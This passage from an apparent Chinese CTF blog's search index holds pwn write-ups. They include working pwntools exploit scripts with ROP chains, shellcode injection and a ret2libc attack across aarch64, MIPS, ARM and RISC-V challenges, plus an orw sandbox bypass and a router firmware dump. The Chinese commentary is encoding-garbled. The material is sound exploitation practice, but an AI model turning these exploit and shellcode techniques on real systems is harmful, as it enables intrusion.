    # io = process(&amp;quot;&amp;quot;)
    context(arch=&#39;aarch64&#39;, os=&#39;linux&#39;)
    # context.terminal[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        context(arch=&#39;aarch64&#39;, os=&#39;linux&#39;)
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

csu_2=0x4008CC
# LDP             X19, X20, [SP,#var_s10]
# LDP             X21, X22, [SP,#var_s20]
# LDP             X23, X24, [SP,#var_s30]
# LDP             X29, X30, [SP+var_s0],#0x40
# RET

#RET è·³è½¬çš„æ˜¯X30ä¿å­˜çš„åœ°å€ï¼ŒX30å­˜æ”¾è¿”å›åœ°å€

csu_1=0x4008ac
# LDR             X3, [X21,X19,LSL#3]  æ­¤å¤„æ§åˆ¶X19å€¼ä¸º0å³å¯å°†X21å€¼èµ‹å€¼ç»™X3
# MOV             X2, X22
# MOV             X1, X23
# MOV             W0, W24
# ADD             X19, X19, #1
# BLR             X3
# CMP             X19, X20
# B.NE            loc_4008AC



mprotect=elf.plt[b&amp;quot;mprotect&amp;quot;]
# STP             X29, X30, [SP,#-0x10+var_s0]!
# MOV             X29, SP
# MOV             W2, #0                  ; prot
# MOV             X1, #0x1000             ; len
# MOV             X0, #off_411000         ; addr
# BL              .mprotect
# NOP
# LDP             X29, X30, [SP+var_s0],#0x10
# RET


tar_addr=0x411068

io.sendafter(b&amp;quot;Name:&amp;quot;,p64(mprotect)+asm(shellcraft.sh()))
# payload=cyclic(0x48)+asm(shellcraft.sh())

payload=cyclic(0x48)+p64(csu_2)
payload+=p64(0)+p64(csu_1) # X19-&amp;gt;0 X30-&amp;gt;csu_1
payload+=p64(0)+p64(1) # X19-&amp;gt;0 X20-&amp;gt;1
payload+=p64(tar_addr)+p64(7)+p64(0x1000)+p64(tar_addr+8) # X3-&amp;gt;X21-&amp;gt;tar_addr X2-&amp;gt;X22-&amp;gt;7 X1-&amp;gt;X23-&amp;gt;0x1000 W0-&amp;gt;W24(X24)-&amp;gt;tar_addr+0x8

payload+=p64(0)+p64(tar_addr+0x8) # mprotect X29-&amp;gt;0 X30-&amp;gt;tar_addr+0x8

io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;axb_2019_mips&#34;&gt;axb_2019_mips:&lt;/h3&gt;
&lt;p&gt;mipsæ˜¯å…³é—­äº†nxçš„ï¼Œå¯ä»¥æ„é€ readå°†shellcodeè¯»å…¥bssæ®µç„¶åè·³è½¬åˆ°bssæ®µæ‰§è¡Œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.buuoj.cn&amp;quot;,27635]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    # context.log_level=&amp;quot;debug&amp;quot; 
    #io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;/usr/aarch64-linux-gnu/&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./stack&amp;quot;]) 
    io = process([&amp;quot;qemu-mipsel-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;,&amp;quot;-L&amp;quot;,&amp;quot;.&amp;quot;,&amp;quot;./pwn2&amp;quot;]) 
    # io = process(&amp;quot;&amp;quot;)
    context(arch=&#39;mips&#39;,endian=&#39;little&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
    # context.terminal[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;mips&#39;,endian=&#39;little&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

shellcode=asm(shellcraft.sh())
bss_addr=0x410c00
read_text=0x4007e0

io.sendafter(b&amp;quot;name: \n&amp;quot;,b&amp;quot;aaa&amp;quot;)

# payload=cyclic(0x200)
#offset 36

# # NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)
# for i in range(29):
#     payload += b&amp;quot;\x26\x40\x08\x01&amp;quot;

payload=cyclic(0x20)+p32(bss_addr)+p32(read_text)
io.sendafter(b&amp;quot;aaa&amp;quot;,payload)

sleep(1)

payload=cyclic(0x24)+p32(bss_addr+0x40)+b&amp;quot;\x26\x40\x08\x01&amp;quot;*20+shellcode
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ycb_2020_mipspwn&#34;&gt;ycb_2020_mipspwn:&lt;/h3&gt;
&lt;p&gt;mipselï¼Œæ‰“æ³•åŒä¸Šï¼Œå‘bssæ®µå†™å…¥shellcodeè·³è½¬æ‰§è¡Œ&lt;br&gt;
æ­¤é¢˜éœ€è¦é™åˆ¶ä¸€ä¸‹shellcodeé•¿åº¦ï¼Œä½¿ç”¨shellcraftç”Ÿæˆçš„è¿‡é•¿äº†&lt;br&gt;
å¯ä»¥ä¸Šexdbæ‰¾:&lt;a href=&#34;https://www.exploit-db.com/shellcodes/13300&#34;&gt;https://www.exploit-db.com/shellcodes/13300&lt;/a&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.buuoj.cn&amp;quot;,26964]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    # context.log_level=&amp;quot;debug&amp;quot; 
    #io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;/usr/aarch64-linux-gnu/&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-mipsel-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;,&amp;quot;-L&amp;quot;,&amp;quot;.&amp;quot;,&amp;quot;./pwn2&amp;quot;]) 
    io = process([&amp;quot;qemu-mipsel-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;,&amp;quot;./pwn2&amp;quot;]) 
    # io = process(&amp;quot;&amp;quot;)
    context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
    # context.terminal[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;mips&#39;,endian=&#39;little&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)
        
        
bss_addr=0x411700
read_text=0x400f50


io.sendafter(b&amp;quot;here:\n&amp;quot;,b&amp;quot;aaa&amp;quot;)
io.recv()
io.sendline(b&amp;quot;7&amp;quot;)

#payload=cyclic(0x200)
#offset 60

payload=cyclic(56)+p32(bss_addr)+p32(read_text)
io.sendafter(b&amp;quot;feeling:\n&amp;quot;,payload)

shellcode=b&amp;quot;\xff\xff\x10\x04\xab\x0f\x02\x24&amp;quot;
shellcode+=b&amp;quot;\x55\xf0\x46\x20\x66\x06\xff\x23&amp;quot;
shellcode+=b&amp;quot;\xc2\xf9\xec\x23\x66\x06\xbd\x23&amp;quot;
shellcode+=b&amp;quot;\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf&amp;quot;
shellcode+=b&amp;quot;\x9a\xf9\xbd\x23\x21\x20\x80\x01&amp;quot;
shellcode+=b&amp;quot;\x21\x28\xa0\x03\xcc\xcd\x44\x03&amp;quot;
shellcode+=b&amp;quot;/bin/sh&amp;quot;

payload=b&amp;quot;a&amp;quot;*60+p32(bss_addr+88)+shellcode

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;hkcert2023_rop&#34;&gt;hkcert2023_rop:&lt;/h3&gt;
&lt;p&gt;mipsï¼Œæ„é€ getså¾€å¯å†™æ®µä¸Šå†™shellcodeï¼Œå†æ‰¾gadgetè·³è¿‡å»ï¼Œæœ€åæº¢å‡ºè·³è½¬&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;chal.hkcert23.pwnable.hk&amp;quot;,28151]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    context.log_level=&amp;quot;debug&amp;quot; 
    p = process([&amp;quot;qemu-mips-static&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./rop&amp;quot;]) 
    elf=ELF(&amp;quot;./rop&amp;quot;)
    # p = process([&amp;quot;qemu-mips-static&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./rop&amp;quot;]) 
    # p = process(&amp;quot;./rop&amp;quot;)
    context(arch=&#39;mips&#39;,endian=&#39;big&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
    context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;mips&#39;,endian=&#39;big&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
        p = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

# gdb.attach(p)
# pause()
nop=b&amp;quot;\x01\x08\x40\x26&amp;quot;
shellcode = asm(&#39;&#39;&#39;
  lui $t7, 0x2f2f
  ori $t7, $t7,0x6269
  lui $t6, 0x6e2f
  ori $t6, $t6, 0x7368
  sw $t7, -12($sp)
  sw $t6, -8($sp)
  sw $zero, -4($sp)
  addiu $a0, $sp, -12
  slti $a1, $zero, -1
  slti $a2, $zero, -1
  li $v0, 4011
  syscall 0x040405
&#39;&#39;&#39;)

#                   LAB_00456c34                          XREF[1]:  00456c20(j)  
#  00456c34 8f bf       lw       ra,local_4(sp)
#          00 5c
#  00456c38 8f a2       lw       v0,local_3c(sp)
#          00 24
#  00456c3c 8f b3       lw       s3,local_8(sp)
#          00 58
#  00456c40 8f b2       lw       s2,local_c(sp)
#          00 54
#  00456c44 8f b1       lw       s1,local_10(sp)
#          00 50
#  00456c48 8f b0       lw       s0,local_14(sp)
#          00 4c
#  00456c4c 03 e0       jr       ra
#          00 08



gets_text=0x400820


payload=flat(
    {
        0x24:p32(0x49cc20),
        0x4c:p32(0),
        0x5c:p32(gets_text),
    }
)


p.sendlineafter(b&amp;quot;input : \n&amp;quot;,b&amp;quot;a&amp;quot;*72+p32(0x49cc20)+p32(0x456c34)+payload)

p.sendline(shellcode+cyclic(0x64-len(shellcode))+p32(0x49cc20))


p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;mtctf-2022aarch64_ret2libc&#34;&gt;[MTCTF 2022]aarch64_ret2libc:&lt;/h3&gt;
&lt;p&gt;aarch64ï¼Œæ³„éœ²çš„libcæœ‰&lt;code&gt;\x00&lt;/code&gt;æˆªæ–­ï¼Œå¹³å°ä¸Šéœ€è¦çˆ†ç ´åœ°å€&lt;br&gt;
æ‰¾&lt;code&gt;ldr&lt;/code&gt;å’Œ&lt;code&gt;ldp&lt;/code&gt;æŒ‡ä»¤çš„gadgetï¼Œæ§åˆ¶çš„&lt;code&gt;x0&lt;/code&gt;ä¸º&lt;code&gt;/bin/sh&lt;/code&gt;åœ°å€ï¼Œ&lt;code&gt;x30&lt;/code&gt;ä¸ºretåœ°å€&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.anna.nssctf.cn&amp;quot;,28926]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    context.log_level=&amp;quot;debug&amp;quot; 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./pwn&amp;quot;]) 
    io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;,&amp;quot;./pwn&amp;quot;]) 
    elf = ELF(&amp;quot;./pwn&amp;quot;)
    libc = ELF(&amp;quot;./lib/libc.so.6&amp;quot;)
    # io = process([&amp;quot;qemu-mips-static&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./pwn&amp;quot;]) 
    # io = process(&amp;quot;./pwn&amp;quot;)
    context(arch=&#39;aarch64&#39;,os=&#39;linux&#39;)
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        elf = ELF(&amp;quot;./pwn&amp;quot;)
        libc = ELF(&amp;quot;./lib/libc.so.6&amp;quot;)
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 


def get_gift(cc):
    io.sendlineafter(b&amp;quot;&amp;gt;\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;sensible&amp;gt;&amp;gt;\n&amp;quot;,cc)

def overflow(cc):
    io.sendlineafter(b&amp;quot;&amp;gt;\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,cc)

ct=0
num=[]
for i in range(0x10,0x100):
    num.append(i)
for i in range(0,0xf0):
    print(&amp;quot;ct: &amp;quot;,hex(num[i]))

while(True):
    # try:
        elf = ELF(&amp;quot;./pwn&amp;quot;)
        libc = ELF(&amp;quot;./lib/libc.so.6&amp;quot;)
        io = remote(remote_addr[0],remote_addr[1])
        # io = process([&amp;quot;qemu-mips-static&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./pwn&amp;quot;]) 
        # io = process(&amp;quot;./pwn&amp;quot;)
        context(arch=&#39;aarch64&#39;,os=&#39;linux&#39;)
        puts_got=elf.got[b&amp;quot;puts&amp;quot;]

        get_gift(p64(puts_got))

        leak_addr=u64(io.recv(3).ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
        print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

        base_addr=0x4000000000
        # base_addr = base_addr * num[ct]
        print(&amp;quot;base_addr: &amp;quot;,hex(base_addr))
        ct = ct+1
        # base_addr=0x0

        sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]+base_addr
        str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))+base_addr

        print(&amp;quot;sys_addr: &amp;quot;,hex(sys_addr))
        print(&amp;quot;str_sh: &amp;quot;,hex(str_sh))

        gadget=leak_addr+0xb6518+base_addr
        # 0x00000000000b6518: ldr x0, [sp, #0x70]; ldp x29, x30, [sp], #0x1a0; ret;
        # payload=cyclic(0x100)
        print(&amp;quot;offset: &amp;quot;,hex(cyclic_find(0x6261616a))) #0x88

        payload=cyclic(0x88)+p64(gadget)

        fake_stack=cyclic(0x10)+p64(sys_addr)*2
        fake_stack=fake_stack.ljust(0x80,b&amp;quot;a&amp;quot;)+p64(str_sh)
        # fake_stack=fake_stack.ljust(0xc0,b&amp;quot;a&amp;quot;)+p64(0xbeefdead)+p64(sys_addr)
        overflow(payload+fake_stack)
        sleep(0.2)
        io.interactive()
    #     io.sendline(b&amp;quot;cat flag&amp;quot;)
    #     sleep(0.2)
    #     t=io.recv()
    #     print(t)
    #     if b&amp;quot;NSS&amp;quot; in t:
    #         break
    #     else:
    #         io.close()
    #         continue
    # except:
    #     io.close()
    #     continue
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;htb_arms_roped&#34;&gt;htb_arms_roped:&lt;/h3&gt;
&lt;p&gt;å‡ºé¢˜äººçš„ldå’ŒğŸä¸€èµ·ç¼ºå¤±äº† ï¼Œsbé¢˜ğŸ˜…ğŸ˜…ğŸ˜…&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
# remote_addr = [&amp;quot;167.99.82.136&amp;quot;,32375]
remote_addr = [&amp;quot;167.99.85.216&amp;quot;,31954]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    context.log_level=&amp;quot;debug&amp;quot; 
    io = process([&amp;quot;qemu-arm&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./arms_roped&amp;quot;]) 
    elf = ELF(&amp;quot;./arms_roped&amp;quot;)
    # libc = ELF(&amp;quot;./arm-linux-gnueabihf/lib/libc.so.6&amp;quot;)
    # io = process([&amp;quot;qemu-arm&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./rop&amp;quot;]) 
    # io = process(&amp;quot;./rop&amp;quot;)
    context(arch=&#39;arm&#39;,endian=&#39;little&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
    context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;arm&#39;,endian=&#39;little&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
        io = remote(remote_addr[0],remote_addr[1])
        elf = ELF(&amp;quot;./arms_roped&amp;quot;)
        # libc = ELF(&amp;quot;./arm-linux-gnueabihf/lib/libc.so.6&amp;quot;)
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

### leak canary
payload=b&amp;quot;a&amp;quot;*0x21
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x21)
canary=u32(io.recv(3)[-4:].rjust(4,b&amp;quot;\x00&amp;quot;))
log.success(&amp;quot;canary: &amp;quot;+hex(canary))


### leak base
payload=b&amp;quot;a&amp;quot;*0x30
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x30)
# base_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))+0x40000000-0x948
base_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))-0x948
log.success(&amp;quot;base_addr: &amp;quot;+hex(base_addr))


### leak libc
payload=b&amp;quot;a&amp;quot;*0x48
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x48)
leak_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))-153-0x1748C
log.success(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

# sys_addr=leak_addr+0x2F5C8 9.9
sys_addr=leak_addr+0x2F510+1  # alignment
### 0002F510

# str_sh=leak_addr+0x0DCE38 9.9
str_sh=leak_addr+0x0DCE0C
### 00DCE0C

log.success(&amp;quot;sys_addr: &amp;quot;+hex(sys_addr))
log.success(&amp;quot;str_sh: &amp;quot;+hex(str_sh))


# 0x000009ec: pop {r4, r5, r6, r7, r8, sb, sl, pc};
# 0x000009d8: mov r0, r7; add r4, r4, #1; blx r3;
# 0x0000056c: pop {r3, pc};

mov_all=base_addr+0x9d8
pop_r4_r5_r6_r7_r8_sb_sl_pc=base_addr+0x9ec
pop_r3_pc=base_addr+0x56c


log.success(&amp;quot;mov_all: &amp;quot;+hex(mov_all))
log.success(&amp;quot;pop_r4_r5_r6_r7_r8_sb_sl_pc: &amp;quot;+hex(pop_r4_r5_r6_r7_r8_sb_sl_pc))
log.success(&amp;quot;pop_r3_pc: &amp;quot;+hex(pop_r3_pc))


payload=cyclic(0x20)+p32(canary)+p32(0xdeadbeef)*3
payload+=p32(pop_r4_r5_r6_r7_r8_sb_sl_pc)

payload+=p32(0)*3
payload+=p32(str_sh) # r7-&amp;gt;str_sh
payload+=p32(0)*3
payload+=p32(pop_r3_pc)

payload+=p32(sys_addr)+p32(mov_all)

io.sendline(payload)

# io.sendline(b&amp;quot;quit&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">å¼‚æ„åˆæ¢</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/V0Hk19jqQ/"" data-c="
          &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;â”€[fk@fk]â”€[~/Desktop/cve/1/_US_D301V1.0BR_V1.2.7.8_cn_td.bin.extracted/squashfs-root/bin]
â””â”€â”€â•¼ $readelf -h busybox 
ELF å¤´ï¼š
  Magicï¼š  7f 45 4c 46 01 02 01 00 00 00 00 00 00 00 00 00 
  ç±»åˆ«:                              ELF32
  æ•°æ®:                              2 è¡¥ç ï¼Œå¤§ç«¯åº (big endian)
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI ç‰ˆæœ¬:                          0
  ç±»å‹:                              EXEC (å¯æ‰§è¡Œæ–‡ä»¶)
  ç³»ç»Ÿæ¶æ„:                          MIPS R3000
  ç‰ˆæœ¬:                              0x1
  å…¥å£ç‚¹åœ°å€ï¼š              0x403f90
  ç¨‹åºå¤´èµ·ç‚¹ï¼š              52 (bytes into file)
  Start of section headers:          0 (bytes into file)
  æ ‡å¿—ï¼š             0x50001007, noreorder, pic, cpic, o32, mips32
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         7
  Size of section headers:           0 (bytes)
  Number of section headers:         0
  Section header string table index: 0


&lt;/code&gt;&lt;/pre&gt;
">tenda d301</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/FU4AxD3vB/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNï¼š&lt;/h3&gt;
&lt;h4 id=&#34;newbottleoldwine&#34;&gt;NewBottleOldWineï¼š&lt;/h4&gt;
&lt;p&gt;riscv64é¢˜ç›®ï¼Œghidraç¼–è¯‘ä¸‹èƒ½æ­£å¸¸çœ‹ä¼ªä»£ç ï¼Œä½†æ˜¯å…³é”®å¤„æ¶ˆå¤±ï¼Œç»“åˆida64å¯ä»¥æ‰¾å‡ºå…³é”®ä»£ç &lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1693471956608.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
çº¢è‰²è¿™å¨ghidraå•¥ä¹Ÿæ²¡æœ‰ï¼Œä¸è¿‡idaåç¼–è¯‘è¿‡åç»“åˆåç§»å¯çŸ¥0x11451622æ­¤å¤„æ˜¯getshellçš„&lt;/p&gt;
&lt;p&gt;ä¸€å¼€å§‹è¯•åç§»ï¼Œæ­£æ•°å‘ç°åˆ°ä¸äº†æŒ‡å®šä½ç½®ï¼Œäºæ˜¯è€ƒè™‘æ•´æ•°æº¢å‡ºï¼Œæ…¢æ…¢è¯•åç§»å¯ä»¥è¯•å‡ºæ¥&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1693471963171.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;æœ€åå€¼ä¸º-30064770526æ—¶åˆšå¥½å¯ä»¥è·³è½¬åˆ°0x11451622æ‹¿shell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1693471966762.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;riscv&#39;,bits=64)

io=remote(&amp;quot;node6.anna.nssctf.cn&amp;quot;,28016)

payload=b&amp;quot;-30064770526&amp;quot;

io.sendafter(&amp;quot;have?\n&amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;happy2&#34;&gt;happy2&lt;/h4&gt;
&lt;p&gt;åˆ©ç”¨&lt;code&gt;scanf()&lt;/code&gt;è¾“å…¥&lt;code&gt;+-&lt;/code&gt;å·ä¸è¦†ç›–å€¼çš„ç‰¹æ€§ï¼Œå¯ä»¥ä»¥æ­¤æ³„éœ²&lt;code&gt;_IO_2_1_stderr_&lt;/code&gt;åœ°å€ï¼Œç„¶åè¾“å…¥&lt;code&gt;puts&lt;/code&gt;åœ°å€è¿›å…¥fork()è¿›ç¨‹&lt;br&gt;
å¼€å¯æ²™ç›’ç¦ç”¨&lt;code&gt;read connect fork execveat&lt;/code&gt;&lt;br&gt;
å¯ä»¥ç”¨&lt;code&gt;openat+pread+writev&lt;/code&gt;æ‰“orw&lt;br&gt;
shellcraftçš„openatå‡½æ•°æœ‰é—®é¢˜ï¼Œè¿˜æ˜¯æ‰‹å†™æ¯”è¾ƒç¨³&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(&amp;quot;123.249.2.218&amp;quot;,10000)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

io.sendlineafter(b&amp;quot;konw\n&amp;quot;,b&amp;quot;2&amp;quot;)

gdb.attach(io)
pause()

io.sendline(b&amp;quot;+&amp;quot;)
io.sendline(b&amp;quot;+&amp;quot;)
leak_addr=int(io.recvuntil(b&amp;quot;you konw&amp;quot;,drop=True))-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]
puts_addr=leak_addr+libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;puts_addr: &amp;quot;,hex(puts_addr))

io.recvuntil(b&amp;quot;now you need to have a try\n&amp;quot;)
io.sendline(str(puts_addr).encode())

payload = asm(&#39;mov rax, 0x67616c66; push rax; mov rdi, 0xffffff9c; mov rsi,rsp; xor rdx,rdx; mov rax,257;syscall;&#39;) #openat flag
# payload = asm(&#39;mov rax, 0x67616c66; push rax; mov rdi,rsp; xor rsi,rsi; xor rdx,rdx; mov rax,2;syscall;&#39;) #open flag
payload += asm(shellcraft.pread(3,0x10500,0x100,0))
payload += asm(shellcraft.writev(1,0x10100,1))
payload = payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+flat(0x10500,0x100)

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1693472560284.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;misc&#34;&gt;MISCï¼š&lt;/h3&gt;
&lt;h4 id=&#34;gift_in_qrcode&#34;&gt;gift_in_qrcodeï¼š&lt;/h4&gt;
&lt;p&gt;æœ€å¼€å§‹æœ¬æ¥è¯´çˆ†ç ´ï¼Œç»“æœç»™çš„å°±æ˜¯ç­”æ¡ˆï¼Œç™½ç»™&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1693471973688.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;gift_in_qrcoderevenge&#34;&gt;gift_in_qrcode(revenge):&lt;/h4&gt;
&lt;p&gt;çŸ¥é“ä¸€ä¸ªæ­£ç¡®ç­”æ¡ˆå°±å¯ä»¥çˆ†ç ´äº†&lt;br&gt;
çˆ†ç ´è„šæœ¬ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;)

    
while True:
    try:
        
        io=remote(&amp;quot;node6.anna.nssctf.cn&amp;quot;,28833)

        payload=b&amp;quot;19&amp;quot;

        io.sendlineafter(b&amp;quot;answer:&amp;quot;,payload)

        t=io.recv()
        print(t)
        
        if b&amp;quot;No&amp;quot; in t:
            print(&amp;quot;FAILED&amp;quot;)
            io.close()
        else:
            print(t)
            print(&amp;quot;SUCCEED&amp;quot;)
            sys.exit(0)
        
    except:
        io.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;magic-docker&#34;&gt;Magic Dockerï¼š&lt;/h4&gt;
&lt;p&gt;pullä¸‹æ¥saveåˆ°æœ¬åœ°è¿›å»å°±æœ‰flag&lt;/p&gt;
